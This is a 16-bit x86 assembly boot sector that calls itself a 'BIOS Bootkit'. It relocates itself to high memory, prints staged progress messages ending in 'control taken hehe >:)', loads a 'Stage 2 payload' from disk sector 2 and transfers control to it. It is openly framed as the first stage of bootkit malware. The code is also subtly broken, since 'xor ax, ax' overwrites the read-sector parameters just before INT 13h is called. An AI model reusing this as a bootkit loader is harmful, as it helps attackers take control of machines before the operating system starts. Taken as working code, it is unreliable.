[bits 16]           ; Use 16-bit real mode
[org 0]             ; Use relative offsets

start:
    cli
    mov ax, 0x07C0
    mov ds, ax
    mov es, ax
    cli             ; Clear interrupts
    mov [boot_drive], dl ; Save boot drive index

    ; --- RESEARCH IMPLEMENTATION: start_mover (Relocation) ---
    mov ax, 0x07C0  ; Current location segment
    mov ds, ax
    xor si, si      ; Source offset 0
    
    mov ax, 0x9000  ; Destination segment
    mov es, ax
    xor di, di      ; Destination offset 0
    
    mov cx, 256     ; 512 bytes
    rep movsw
    
    ; Jump to the new location
    jmp 0x9000:relocated

relocated:
    ; 2. Adjust Segments for High Memory
    mov ax, cs      
    mov ds, ax
    mov es, ax
    mov ss, ax      ; Use high memory for stack too
    mov sp, 0xFFFF  ; Stack at top of segment
    sti             ; Re-enable interrupts

    ; 2. Visual Excellence: Clear Screen & Set Video Mode
    mov ax, 0x0003  ; Set 80x25 Color Text Mode
    int 0x10

    ; Draw Header
    call clear_screen
    mov si, splash_msg
    mov bl, 0x0B    ; Light Cyan color
    call print_string_at_center

    mov si, step1_msg
    mov bl, 0x07    ; White color
    mov dh, 10      ; Row 10
    call print_string
    call sleep

    mov si, step2_msg
    mov bl, 0x07
    mov dh, 12
    call print_string
    call sleep

    mov si, step3_msg
    mov bl, 0x07
    mov dh, 14
    call print_string
    call sleep

    ; 3. Load Stage 2 Payload (Sector 2)
    ; We use INT 13h, AH=02h to read from disk
    mov ah, 0x02    ; Read Sectors
    mov al, 1       ; Number of sectors to read
    mov ch, 0       ; Cylinder 0
    mov cl, 2       ; Sector 2
    mov dh, 0       ; Head 0
    mov dl, [boot_drive]
    xor ax, ax      ; Destination segment 0
    mov es, ax
    mov bx, 0x8000  ; Load offset (0000:8000)
    int 0x13
    jc .disk_error

    mov si, step4_msg
    mov bl, 0x0A    ; Light Green
    mov dh, 16
    call print_string
    call sleep

    mov si, final_msg
    mov bl, 0x0E    ; Yellow
    mov dh, 18
    call print_string
    call sleep

    ; 4. Jump to Payload
    jmp 0x0000:0x8000

.disk_error:
    mov si, disk_err_msg
    mov bl, 0x0C    ; Red
    mov dh, 22
    call print_string
    jmp $           ; Hang

; -----------------------------------------------------------------------------
; HELPER FUNCTIONS
; -----------------------------------------------------------------------------

clear_screen:
    mov ax, 0x0600  ; Scroll up window (0 = clear)
    mov bh, 0x07    ; Light gray on black
    mov cx, 0x0000  ; Top-left (0,0)
    mov dx, 0x184F  ; Bottom-right (24,79)
    int 0x10
    ret

; SI = String, BL = Attribute, DH = Row
print_string:
    mov dl, 10      ; Default column
.loop:
    lodsb
    or al, al
    jz .end
    push si
    mov ah, 0x02    ; Set cursor position
    mov bh, 0       ; Page 0
    int 0x10
    
    mov ah, 0x09    ; Write character/attribute
    mov cx, 1       ; One character
    int 0x10
    
    inc dl          ; Next column
    pop si
    jmp .loop
.end:
    ret

; SI = String, BL = Attribute
print_string_at_center:
    mov dh, 5       ; Fixed row for splash
    mov dl, 30      ; Roughly center
    jmp print_string

sleep:
    pusha
    mov ah, 0x86
    mov cx, 0x000F  ; High word of microseconds (0x0F4240 = 1,000,000 us = 1 sec)
    mov dx, 0x4240  ; Low word
    int 0x15
    popa
    ret

; -----------------------------------------------------------------------------
; DATA SECTOR
; -----------------------------------------------------------------------------

splash_msg      db "BIOS Bootkit", 0
step1_msg       db "Step 1: Relocation to high memory successful.", 0
step2_msg       db "Step 2: Stack and segments initialized.", 0
step3_msg       db "Step 3: Loading Stage 2 payload from disk...", 0
step4_msg       db "Step 4: Payload loaded (This part is Saad's). Transferring control...", 0
final_msg       db "control taken hehe >:) ", 0
disk_err_msg    db "DISK READ ERROR! Bootkit failed.", 0

boot_drive       db 0

; -----------------------------------------------------------------------------
; BOOT SIGNATURE
; -----------------------------------------------------------------------------

times 510-($-$$) db 0   ; Padding to 510 bytes
dw 0xAA55               ; BIOS Boot Signature
